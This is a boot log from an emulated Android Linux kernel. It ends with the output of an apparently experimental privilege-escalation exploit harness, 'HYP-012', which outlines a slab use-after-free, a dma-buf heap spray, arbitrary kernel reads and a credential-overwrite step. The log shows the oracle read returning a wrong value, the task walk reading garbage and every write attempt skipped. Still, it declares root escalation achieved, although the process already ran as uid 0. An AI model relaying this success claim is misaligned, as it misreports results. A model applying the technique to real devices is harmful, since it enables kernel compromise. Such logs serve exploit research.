[    0.000000][    T0] Booting Linux on physical CPU 0x0000000000 [0x411fd070]
[    0.000000][    T0] Linux version 6.1.23-android14-4-maybe-dirty (build-user@build-host) (Android (10087095, +pgo, +bolt, +lto, -mlgo, based on r487747c) clang version 17.0.2 (https://android.googlesource.com/toolchain/llvm-project d9f89f4d16663d5012e5c09495f3b30ece3d2362), LLD 17.0.2) #1 SMP PREEMPT Thu Jan  1 00:00:00 UTC 1970
[    0.000000][    T0] random: crng init done
[    0.000000][    T0] Machine model: linux,dummy-virt
[    0.000000][    T0] Stack Depot is disabled
[    0.000000][    T0] KVM is not available. Ignoring kvm-arm.mode
[    0.000000][    T0] earlycon: pl11 at MMIO 0x0000000009000000 (options '')
[    0.000000][    T0] printk: bootconsole [pl11] enabled
[    0.000000][    T0] efi: UEFI not found.
[    0.000000][    T0] Zone ranges:
[    0.000000][    T0]   DMA32    [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0]   Normal   empty
[    0.000000][    T0]   Device   empty
[    0.000000][    T0] Movable zone start for each node
[    0.000000][    T0] Early memory node ranges
[    0.000000][    T0]   node   0: [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0] Initmem setup node 0 [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0] cma: Reserved 16 MiB at 0x00000000bc800000
[    0.000000][    T0] psci: probing for conduit method from DT.
[    0.000000][    T0] psci: PSCIv1.1 detected in firmware.
[    0.000000][    T0] psci: Using standard PSCI v0.2 function IDs
[    0.000000][    T0] psci: Trusted OS migration not required
[    0.000000][    T0] psci: SMC Calling Convention v1.0
[    0.000000][    T0] 'bootconfig' found on command line, but no bootconfig found
[    0.000000][    T0] percpu: Embedded 29 pages/cpu s80936 r8192 d29656 u118784
[    0.000000][    T0] Detected PIPT I-cache on CPU0
[    0.000000][    T0] CPU features: SYS_ID_AA64MMFR1_EL1[11:8]: already set to 0
[    0.000000][    T0] CPU features: detected: Spectre-v2
[    0.000000][    T0] CPU features: detected: Spectre-v3a
[    0.000000][    T0] CPU features: detected: Spectre-v4
[    0.000000][    T0] CPU features: detected: Spectre-BHB
[    0.000000][    T0] CPU features: detected: ARM erratum 834220
[    0.000000][    T0] CPU features: detected: ARM erratum 1742098
[    0.000000][    T0] CPU features: detected: ARM erratum 832075
[    0.000000][    T0] CPU features: detected: ARM errata 1165522, 1319367, or 1530923
[    0.000000][    T0] alternatives: applying boot alternatives
[    0.000000][    T0] Built 1 zonelists, mobility grouping on.  Total pages: 516096
[    0.000000][    T0] Kernel command line: console=ttynull stack_depot_disable=on cgroup_disable=pressure kasan.page_alloc.sample=10 kasan.stacktrace=off kvm-arm.mode=protected bootconfig ioremap_guard console=ttyAMA0 root=/dev/ram0 kasan=off nokaslr earlycon=pl011,0x09000000 printk.devkmsg=on isolcpus=1 nohz_full=1 rcu_nocbs=1 rw
[    0.000000][    T0] cgroup: Disabling pressure control group feature
[    0.000000][    T0] Housekeeping: nohz unsupported. Build with CONFIG_NO_HZ_FULL
[    0.000000][    T0] Unknown kernel command line parameters "nokaslr nohz_full=1", will be passed to user space.
[    0.000000][    T0] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.000000][    T0] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.000000][    T0] mem auto-init: stack:all(zero), heap alloc:on, heap free:off
[    0.000000][    T0] Memory: 1998580K/2097152K available (16768K kernel code, 1878K rwdata, 5432K rodata, 1344K init, 600K bss, 82188K reserved, 16384K cma-reserved)
[    0.000000][    T0] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.000000][    T0] trace event string verifier disabled
[    0.000000][    T0] rcu: Preemptible hierarchical RCU implementation.
[    0.000000][    T0] rcu: 	RCU event tracing is enabled.
[    0.000000][    T0] rcu: 	RCU restricting CPUs from NR_CPUS=32 to nr_cpu_ids=2.
[    0.000000][    T0] rcu: 	RCU priority boosting: priority 1 delay 500 ms.
[    0.000000][    T0] 	Trampoline variant of Tasks RCU enabled.
[    0.000000][    T0] 	Tracing variant of Tasks RCU enabled.
[    0.000000][    T0] rcu: RCU calculated value of scheduler-enlistment delay is 25 jiffies.
[    0.000000][    T0] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.000000][    T0] NR_IRQS: 64, nr_irqs: 64, preallocated irqs: 0
[    0.000000][    T0] Root IRQ handler: gic_handle_irq
[    0.000000][    T0] GICv2m: range[mem 0x08020000-0x08020fff], SPI[80:143]
[    0.000000][    T0] rcu: 	Offload RCU callbacks from CPUs: 1.
[    0.000000][    T0] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.000000][    T0] arch_timer: cp15 timer(s) running at 62.50MHz (virt).
[    0.000000][    T0] clocksource: arch_sys_counter: mask: 0x1ffffffffffffff max_cycles: 0x1cd42e208c, max_idle_ns: 881590405314 ns
[    0.000092][    T0] sched_clock: 57 bits at 63MHz, resolution 16ns, wraps every 4398046511096ns
[    0.005083][    T0] kfence: initialized - using 524288 bytes for 63 objects at 0x(____ptrval____)-0x(____ptrval____)
[    0.018311][    T0] Calibrating delay loop (skipped), value calculated using timer frequency.. 125.00 BogoMIPS (lpj=250000)
[    0.019033][    T0] pid_max: default: 32768 minimum: 301
[    0.021535][    T0] LSM: Security Framework initializing
[    0.024873][    T0] SELinux:  Initializing.
[    0.029141][    T0] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.029562][    T0] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.088767][    T1] cacheinfo: Unable to detect cache hierarchy for CPU 0
[    0.104404][    T1] cblist_init_generic: Setting adjustable number of callback queues.
[    0.104976][    T1] cblist_init_generic: Setting shift to 1 and lim to 1.
[    0.108109][    T1] cblist_init_generic: Setting shift to 1 and lim to 1.
[    0.113347][    T1] rcu: Hierarchical SRCU implementation.
[    0.113658][    T1] rcu: 	Max phase no-delay instances is 1000.
[    0.132034][    T1] dyndbg: Ignore empty _ddebug table in a CONFIG_DYNAMIC_DEBUG_CORE build
[    0.133354][    T1] EFI services will not be available.
[    0.137559][    T1] smp: Bringing up secondary CPUs ...
[    0.146227][    T0] Detected PIPT I-cache on CPU1
[    0.148053][    T0] cacheinfo: Unable to detect cache hierarchy for CPU 1
[    0.149069][    T0] CPU1: Booted secondary processor 0x0000000001 [0x411fd070]
[    0.156040][    T1] smp: Brought up 1 node, 2 CPUs
[    0.156992][    T1] SMP: Total of 2 processors activated.
[    0.157468][    T1] CPU features: detected: 32-bit EL0 Support
[    0.157764][    T1] CPU features: detected: 32-bit EL1 Support
[    0.158128][    T1] CPU features: detected: CRC32 instructions
[    0.162325][    T1] CPU features: emulated: Privileged Access Never (PAN) using TTBR0_EL1 switching
[    0.163403][    T1] CPU: All CPU(s) started at EL1
[    0.163966][    T1] alternatives: applying system-wide alternatives
[    0.203159][    T1] Registered cp15_barrier emulation handler
[    0.203700][    T1] Registered setend emulation handler
[    0.207377][    T1] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
[    0.208231][    T1] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.217325][    T1] pinctrl core: initialized pinctrl subsystem
[    0.246542][    T1] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.268547][    T1] DMA: preallocated 256 KiB GFP_KERNEL pool for atomic allocations
[    0.270166][    T1] DMA: preallocated 256 KiB GFP_KERNEL|GFP_DMA32 pool for atomic allocations
[    0.271593][    T1] audit: initializing netlink subsys (disabled)
[    0.282365][   T30] audit: type=2000 audit(0.240:1): state=initialized audit_enabled=0 res=1
[    0.283757][    T1] thermal_sys: Registered thermal governor 'step_wise'
[    0.283820][    T1] thermal_sys: Registered thermal governor 'user_space'
[    0.284094][    T1] thermal_sys: Registered thermal governor 'power_allocator'
[    0.284817][    T1] cpuidle: using governor menu
[    0.288083][    T1] hw-breakpoint: found 6 breakpoint and 4 watchpoint registers.
[    0.289406][    T1] ASID allocator initialised with 65536 entries
[    0.291693][    T1] Serial: AMBA PL011 UART driver
[    0.349825][    T1] 9000000.pl011: ttyAMA0 at MMIO 0x9000000 (irq = 13, base_baud = 0) is a PL011 rev1
[    0.352266][    T1] printk: console [ttyAMA0] enabled
[    0.352266][    T1] printk: console [ttyAMA0] enabled
[    0.353346][    T1] printk: bootconsole [pl11] disabled
[    0.353346][    T1] printk: bootconsole [pl11] disabled
[    0.365483][    T1] KASLR disabled on command line
[    0.437242][    T1] iommu: Default domain type: Translated 
[    0.437794][    T1] iommu: DMA domain TLB invalidation policy: strict mode 
[    0.451657][    T1] SCSI subsystem initialized
[    0.454018][    T1] usbcore: registered new interface driver usbfs
[    0.454933][    T1] usbcore: registered new interface driver hub
[    0.455422][    T1] usbcore: registered new device driver usb
[    0.457121][    T1] mc: Linux media interface: v0.10
[    0.457571][    T1] videodev: Linux video capture interface: v2.00
[    0.467539][    T1] pps_core: LinuxPPS API ver. 1 registered
[    0.467838][    T1] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.468321][    T1] PTP clock support registered
[    0.468841][    T1] EDAC MC: Ver: 3.0.0
[    0.484267][    T1] Advanced Linux Sound Architecture Driver Initialized.
[    0.519036][    T1] clocksource: Switched to clocksource arch_sys_counter
[    0.527972][    T1] VFS: Disk quotas dquot_6.6.0
[    0.528527][    T1] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.555516][    T1] NET: Registered PF_INET protocol family
[    0.559453][    T1] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.585266][    T1] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.586143][    T1] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.587086][    T1] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.588573][    T1] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.589300][    T1] TCP: Hash tables configured (established 16384 bind 16384)
[    0.599871][    T1] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.600613][    T1] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.603090][    T1] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.604341][    T1] NET: Registered PF_XDP protocol family
[    0.605036][    T1] PCI: CLS 0 bytes, default 64
[    0.618658][    T8] Trying to unpack rootfs image as initramfs...
[    0.646731][    T1] hw perfevents: enabled with armv8_pmuv3 PMU driver, 7 counters available
[    0.648490][    T1] kvm [1]: HYP mode not available
[    0.672946][    T1] Initialise system trusted keyrings
[    0.683334][    T1] workingset: timestamp_bits=46 max_order=19 bucket_order=0
[    0.785218][    T1] fuse: init (API version 7.37)
[    0.969739][    T1] Key type asymmetric registered
[    0.986303][    T1] Asymmetric key parser 'x509' registered
[    0.988827][    T1] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 239)
[    1.004477][    T1] io scheduler mq-deadline registered
[    1.005533][    T1] io scheduler kyber registered
[    1.023474][    T1] io scheduler bfq registered
[    1.033985][    T1] pl061_gpio 9030000.pl061: PL061 GPIO chip registered
[    1.049001][    T1] pci-host-generic 4010000000.pcie: host bridge /pcie@10000000 ranges:
[    1.050415][    T1] pci-host-generic 4010000000.pcie:       IO 0x003eff0000..0x003effffff -> 0x0000000000
[    1.052519][    T1] pci-host-generic 4010000000.pcie:      MEM 0x0010000000..0x003efeffff -> 0x0010000000
[    1.053206][    T1] pci-host-generic 4010000000.pcie:      MEM 0x8000000000..0xffffffffff -> 0x8000000000
[    1.054501][    T1] pci-host-generic 4010000000.pcie: Memory resource size exceeds max for 32 bits
[    1.055982][    T1] pci-host-generic 4010000000.pcie: ECAM at [mem 0x4010000000-0x401fffffff] for [bus 00-ff]
[    1.058495][    T1] pci-host-generic 4010000000.pcie: PCI host bridge to bus 0000:00
[    1.063356][    T1] pci_bus 0000:00: root bus resource [bus 00-ff]
[    1.063738][    T1] pci_bus 0000:00: root bus resource [io  0x0000-0xffff]
[    1.064032][    T1] pci_bus 0000:00: root bus resource [mem 0x10000000-0x3efeffff]
[    1.064328][    T1] pci_bus 0000:00: root bus resource [mem 0x8000000000-0xffffffffff]
[    1.086462][    T8] Freeing initrd memory: 14184K
[    1.087840][    T1] pci 0000:00:00.0: [1b36:0008] type 00 class 0x060000
[    1.095485][    T1] pci 0000:00:01.0: [1af4:1000] type 00 class 0x020000
[    1.096246][    T1] pci 0000:00:01.0: reg 0x10: [io  0x0000-0x001f]
[    1.096643][    T1] pci 0000:00:01.0: reg 0x14: [mem 0x00000000-0x00000fff]
[    1.097058][    T1] pci 0000:00:01.0: reg 0x20: [mem 0x00000000-0x00003fff 64bit pref]
[    1.097645][    T1] pci 0000:00:01.0: reg 0x30: [mem 0x00000000-0x0003ffff pref]
[    1.105495][    T1] pci 0000:00:01.0: BAR 6: assigned [mem 0x10000000-0x1003ffff pref]
[    1.106296][    T1] pci 0000:00:01.0: BAR 4: assigned [mem 0x8000000000-0x8000003fff 64bit pref]
[    1.107137][    T1] pci 0000:00:01.0: BAR 1: assigned [mem 0x10040000-0x10040fff]
[    1.107521][    T1] pci 0000:00:01.0: BAR 0: assigned [io  0x1000-0x101f]
[    1.120531][    T1] printk: console [ttynull0] enabled
[    1.123070][   T22] cacheinfo: Unable to detect cache hierarchy for CPU 0
[    1.208113][    T1] brd: module loaded
[    1.303892][    T1] loop: module loaded
[    1.326377][    T1] wireguard: WireGuard 1.0.0 loaded. See www.wireguard.com for information.
[    1.327164][    T1] wireguard: Copyright (C) 2015-2019 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
[    1.333962][    T1] MACsec IEEE 802.1AE
[    1.341535][    T1] tun: Universal TUN/TAP device driver, 1.6
[    1.343008][    T1] usbcore: registered new interface driver rtl8150
[    1.343766][    T1] usbcore: registered new interface driver r8152
[    1.344440][    T1] usbcore: registered new interface driver asix
[    1.345091][    T1] usbcore: registered new interface driver ax88179_178a
[    1.345779][    T1] usbcore: registered new interface driver cdc_ether
[    1.346503][    T1] usbcore: registered new interface driver cdc_eem
[    1.347594][    T1] usbcore: registered new interface driver cdc_ncm
[    1.348318][    T1] usbcore: registered new interface driver aqc111
[    1.348956][    T1] usbcore: registered new interface driver r8153_ecm
[    1.360077][    T1] usbcore: registered new interface driver uas
[    1.361055][    T1] usbcore: registered new interface driver usb-storage
[    1.370111][    T1] usbcore: registered new interface driver xpad
[    1.379879][    T1] rtc-pl031 9010000.pl031: registered as rtc0
[    1.382137][    T1] rtc-pl031 9010000.pl031: setting system clock to 2026-09-07T12:34:32 UTC (1788784472)
[    1.386171][    T1] gspca_main: v2.14.0 registered
[    1.387875][    T1] usbcore: registered new interface driver uvcvideo
[    1.391254][    T1] device-mapper: uevent: version 1.0.3
[    1.393664][    T1] device-mapper: ioctl: 4.47.0-ioctl (2022-07-28) initialised: dm-devel@redhat.com
[    1.402338][    T1] sdhci: Secure Digital Host Controller Interface driver
[    1.403257][    T1] sdhci: Copyright(c) Pierre Ossman
[    1.403677][    T1] sdhci-pltfm: SDHCI platform and OF driver helper
[    1.407496][    T1] hid: raw HID events driver (C) Jiri Kosina
[    1.419108][    T1] usbcore: registered new interface driver usbhid
[    1.419701][    T1] usbhid: USB HID core driver
[    1.422040][    T1] ashmem: initialized
[    1.425955][    T1] gnss: GNSS driver registered with major 506
[    1.431114][    T1] usbcore: registered new interface driver snd-usb-audio
[    1.437833][    T1] GACT probability NOT on
[    1.439182][    T1] Mirror/redirect action on
[    1.440652][    T1] netem: version 1.3
[    1.441559][    T1] u32 classifier
[    1.441846][    T1]     input device check on
[    1.442193][    T1]     Actions configured
[    1.475957][    T1] xt_time: kernel timezone is -0000
[    1.477300][    T1] ipip: IPv4 and MPLS over IPv4 tunneling driver
[    1.483746][    T1] gre: GRE over IPv4 demultiplexor driver
[    1.484376][    T1] ip_gre: GRE over IPv4 tunneling driver
[    1.496142][    T1] IPv4 over IPsec tunneling driver
[    1.506418][    T1] Initializing XFRM netlink socket
[    1.507646][    T1] IPsec XFRM device driver
[    1.513079][    T1] NET: Registered PF_INET6 protocol family
[    1.548546][    T1] Segment Routing with IPv6
[    1.549096][    T1] In-situ OAM (IOAM) with IPv6
[    1.552491][    T1] mip6: Mobile IPv6
[    1.559156][    T1] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.566919][    T1] ip6_gre: GRE over IPv6 tunneling driver
[    1.571328][    T1] NET: Registered PF_PACKET protocol family
[    1.571913][    T1] NET: Registered PF_KEY protocol family
[    1.573838][    T1] NET: Registered PF_VSOCK protocol family
[    1.578228][    T1] registered taskstats version 1
[    1.579260][    T1] Loading compiled-in X.509 certificates
[    1.621514][   T54] cryptomgr_probe (54) used greatest stack depth: 15072 bytes left
[    1.626873][    T1] Loaded X.509 cert 'Build time autogenerated kernel key: 3d126cdde7d34f1fa54a4d10fe73f129512afbbc'
[    1.627992][    T1] page_owner is disabled
[    1.629304][    T1] Key type .fscrypt registered
[    1.629553][    T1] Key type fscrypt-provisioning registered
[    1.658855][    T1] input: gpio-keys as /devices/platform/gpio-keys/input/input0
[    1.675060][    T1] ALSA device list:
[    1.675423][    T1]   No soundcards found.
[    1.683449][    T1] uart-pl011 9000000.pl011: no DMA platform data
[    1.769214][    T1] Freeing unused kernel memory: 1344K
[    1.773448][    T1] Run /init as init process
[INIT] Starting init process for T3...
========================================================
=== HYP-012: swaps_poll Write Primitive & Cred Escalation ===
========================================================
[    1.877220][   T56] request_module fs-devtmpfs succeeded, but still no fs?
[*] Initial /sys/kernel/slab/filp/slabs = 1
[*] Allocating background pressure files (4,000 eventfds)...
[*] Peak /sys/kernel/slab/filp/slabs after pressure = 251
[+] PART 2: Pre-armed inner epoll with readable eventfd (rdllist armed)
[HYP-012] MARKER: setup_done epA=4003 inner=4036
[HYP-012] MARKER: close_started
[HYP-012] MARKER: close_done
[*] Freeing Batch A and Batch B enclosing files on victim's slab...
[*] Freeing background pressure files...
[*] Waiting 2.0s for RCU grace period and SLUB slab release...
[*] Post-drain /sys/kernel/slab/filp/slabs = 10 (drop: 251 -> 10)
[HYP-012] MARKER: sandwich_freed slabs_before=251 slabs_after=10
[*] Spraying 8,192 pages (32 MB) of dma-buf allocations...
[+] AAR Oracle Hit! Read inode = 0x9a ('swapper/' = 0x2f72657070617773)
[-] Unexpected inode 0x9a (expected 0x2f72657070617773)
[*] PART 2: Testing epoll_wait(epA) to verify rdllist arming...
[+] PART 2 RESULT: epoll_wait returned 1 ready items!
[*] PART 3: Walking init_task.tasks via AAR to find harness task_struct...
  [ 0] task=0xffffffc00973dac0 pid=154 comm='š' cred=0x9a
  [ 1] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 2] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 3] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 4] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 5] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 6] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 7] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 8] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [ 9] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [10] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [11] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [12] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [13] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [14] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [15] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [16] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [17] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [18] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [19] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [20] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [21] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [22] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [23] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [24] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [25] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [26] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [27] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [28] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [29] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [30] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [31] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [32] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [33] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [34] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [35] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [36] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [37] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [38] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [39] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [40] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [41] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [42] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [43] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [44] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [45] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [46] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [47] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [48] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
  [49] task=0xfffffffffffffbca pid=154 comm='š' cred=0x9a
[-] Failed to locate harness cred pointer via AAR walk. Falling back to init_task cred read...
[*] Fallback init_task cred = 0x9a
[*] Verified harness cred=0x9a, AAR read uid=154, getuid()=0
[*] PART 3 (T3): Executing Gated swaps_poll Write Primitive to zero cred fields...
[-] GATED CHECK FAILED! Skipping poll to prevent kernel panic.
[-] GATED CHECK FAILED! Skipping poll.
[-] GATED CHECK FAILED! Skipping poll.
[*] Privilege Escalation Verification: getuid()=0, geteuid()=0
========================================================
[+ SUCCESS +] ROOT PRIVILEGE ESCALATION ACHIEVED (UID 0)!
========================================================
[HYP-012] MARKER: experiment_complete status=1 final_uid=0
[   20.094438][   T56] reboot: Power down
